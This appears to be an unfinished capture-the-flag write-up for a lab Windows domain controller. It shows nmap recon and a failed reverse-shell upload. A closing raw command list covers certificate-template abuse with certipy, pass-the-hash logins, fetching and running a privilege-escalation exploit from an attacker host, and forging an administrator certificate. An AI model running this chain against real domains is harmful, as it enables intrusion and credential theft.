![](https://github.com/user-attachments/assets/a5aeea9b-11fe-45a0-a90d-7253e0d90575)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:17 +08
Nmap scan report for 10.10.11.71
Host is up (0.0092s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49691/tcp open  unknown
49692/tcp open  unknown
49693/tcp open  unknown
49709/tcp open  unknown
49715/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49691,49692,49693,49709,49715 -sCV 10.10.11.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 20:18 +08
Nmap scan report for 10.10.11.71
Host is up (0.0050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 19:53:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-08-29T19:55:12+00:00; +7h34m52s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-29T19:54:33
|_  start_date: N/A
|_clock-skew: mean: 7h34m51s, deviation: 0s, median: 7h34m51s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.35 seconds
```

## 2. Exploring the web site at `80`

The web site has user account function:

![](https://github.com/user-attachments/assets/251838ab-a158-4190-9cd8-5bd62e873fcf)

Registering as teacher requires verification, so let's register for a student account:

![](https://github.com/user-attachments/assets/9b2735f1-883b-4490-8514-1e518aee5303)

Logging in with the newly registered account grants access to the courses:

![](https://github.com/user-attachments/assets/d55c64b3-f363-4419-acbc-e87073b5bbe8)

Enroll on a course:

![](https://github.com/user-attachments/assets/8f060852-9d02-4da9-99e0-b0c12c82bcef)

Course outline appears after enrolling, the session links are dummy `#` links, but the quiz submission pages have upload function:

![](https://github.com/user-attachments/assets/de655866-dbed-4b80-a1f2-c9210e4bf00b)

![](https://github.com/user-attachments/assets/f053269e-b03b-444d-b4d9-4b5327c032aa)

The site doesn't accept upload of files types other than those stated:

![](https://github.com/user-attachments/assets/bfd00c9e-5ce0-4297-8de8-38116ad72645)

Attempting to upload php reverse shell that has the extension changed to `.pdf` doesn't work either:

![](https://github.com/user-attachments/assets/7fdf53e1-2b73-4a78-9162-f28df56552ac)

## to be updated

```sh
evil-winrm -i 10.10.11.71 -u Sara.B -p Blink182

evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'

certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template Delegated-CRA
certipy-ad req -u Lion.SK@certificate.htb -p '!QAZ2wsx' -dc-ip 10.10.11.71 -target dc01.certificate.htb -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\Ryan.k'
apt update && apt -y install ntpsec-ntpdate
ntpdate -q dc01.certificate.htb
timedatectl set-ntp 0
ntpdate dc01.certificate.htb
certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
evil-winrm -i 10.10.11.71 -u Ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6

curl 10.10.14.6/SeManageVolumeExploit.exe -O SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
certutil -exportPFX my "Certificate-LTD-CA" ca.pfx
download ca.pfx
certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -out admin.pfx
certipy-ad auth -pfx admin.pfx -dc-ip 10.10.11.71
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```
